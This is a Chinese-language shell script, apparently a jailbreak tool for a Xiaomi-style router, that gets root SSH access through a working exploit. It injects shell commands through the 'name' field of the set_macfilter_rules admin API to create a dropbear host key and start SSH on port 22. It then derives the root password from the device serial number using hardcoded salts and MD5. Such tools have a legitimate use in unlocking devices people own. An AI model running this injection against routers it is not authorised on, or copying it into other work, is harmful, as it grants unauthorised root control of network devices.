#!/bin/sh

set -eu

die() { printf '错误: %s\n' "$*" >&2; exit 1; }
command -v curl >/dev/null 2>&1 || die '需要 curl'
command -v openssl >/dev/null 2>&1 || die '需要 openssl'
command -v ssh-keyscan >/dev/null 2>&1 || die '需要 ssh-keyscan (OpenSSH 客户端)'

printf '路由器 IP [192.168.31.1]: '
IFS= read -r ROUTER_IP || die '读取 IP 失败'
ROUTER_IP=${ROUTER_IP:-192.168.31.1}
case "$ROUTER_IP" in
  *[!0-9.]*|'') die '目前仅支持 IPv4 地址' ;;
esac
printf '网页管理后台 STOK（仅输入 stok= 后的值）: '
IFS= read -r STOK || die '读取 STOK 失败'
case "$STOK" in
  ''|*[!a-zA-Z0-9]*) die 'STOK 格式不正确' ;;
esac
printf '设备 SN（用来离线推算 root 密码）: '
IFS= read -r SN || die '读取 SN 失败'
[ -n "$SN" ] || die 'SN 不能为空'

printf '\n此工具会通过已登录的管理接口请求执行命令，开启 22 端口 SSH。\n'
printf '继续？[y/N]: '
IFS= read -r CONFIRM || exit 1
case "$CONFIRM" in y|Y|yes|YES) ;; *) exit 0 ;; esac

BASE_URL="http://${ROUTER_IP}/cgi-bin/luci/;stok=${STOK}/api/xqsystem/set_macfilter_rules"

# 该接口要求 option=0、有效且尚不存在的 MAC；name 字段是命令注入入口。
# 用 curl --data-urlencode 交给 curl 完成换行和特殊字符编码。
send_command() {
  LABEL=$1
  COMMAND=$2
  RAND=$(openssl rand -hex 5) || die '生成随机 MAC 失败'
  MAC="02:$(printf '%s' "$RAND" | sed 's/\(..\)/\1:/g;s/:$//')"
  PAYLOAD=$(printf 'x\n%s\n' "$COMMAND")
  printf '%s ... ' "$LABEL"
  if ! RESP=$(curl --fail --silent --show-error --connect-timeout 4 --max-time 12 \
      -X POST "$BASE_URL" \
      --data-urlencode "mac=$MAC" \
      --data-urlencode "name=$PAYLOAD" \
      --data-urlencode 'option=0'); then
    printf 'HTTP/网络请求失败\n' >&2
    return 1
  fi
  if printf '%s' "$RESP" | grep -Eq '"code"[[:space:]]*:[[:space:]]*0([[:space:]]*[,}]|$)'; then
    printf '接口已接受\n'
  else
    printf '接口拒绝: %s\n' "$RESP" >&2
    return 1
  fi
}

# 不改 release/debug 通道，不改只读 /etc/init.d/dropbear，也不修改 OTA 设置。
# 对预置的 0 字节 host key 进行修复，然后直接启动 dropbear。
send_command '[1/2] 生成 SSH 主机密钥' \
  'test -s /etc/dropbear/dropbear_rsa_host_key || { mkdir -p /etc/dropbear && rm -f /etc/dropbear/dropbear_rsa_host_key && dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key; }' \
  || die '接口调用未成功；请检查 STOK 或固件适用性'
send_command '[2/2] 启动 SSH 服务' \
  'pidof dropbear >/dev/null 2>&1 || /usr/sbin/dropbear -p 22' \
  || die '接口调用未成功'

printf '检测 SSH 端口及 RSA 主机密钥 ... '
if ! ssh-keyscan -T 5 -t rsa "$ROUTER_IP" 2>/dev/null | grep -q 'ssh-rsa'; then
  die '未检测到 SSH 服务；接口 code=0 不代表注入命令执行成功'
fi
printf '已检测到 SSH 主机密钥（仍需登录验证）\n'

case "$SN" in
  */*) SALT='6d2df50a-250f-4a30-a5e6-d44fb0960aa0' ;;
  *)   SALT='A2E371B0-B34B-48A5-8C40-A7133F3B5D88' ;;
esac
PASSWORD=$(printf '%s%s' "$SN" "$SALT" | openssl dgst -md5 -r | awk '{print substr($1,1,8)}')
printf '\nSSH: root@%s\n推算密码: %s\n' "$ROUTER_IP" "$PASSWORD"
printf '要现在连接吗？[y/N]: '
IFS= read -r CONNECT || exit 0
case "$CONNECT" in
  y|Y|yes|YES)
    exec ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa "root@$ROUTER_IP"
    ;;
  *) printf '稍后可执行: ssh -o HostKeyAlgorithms=+ssh-rsa root@%s\n' "$ROUTER_IP" ;;
esac
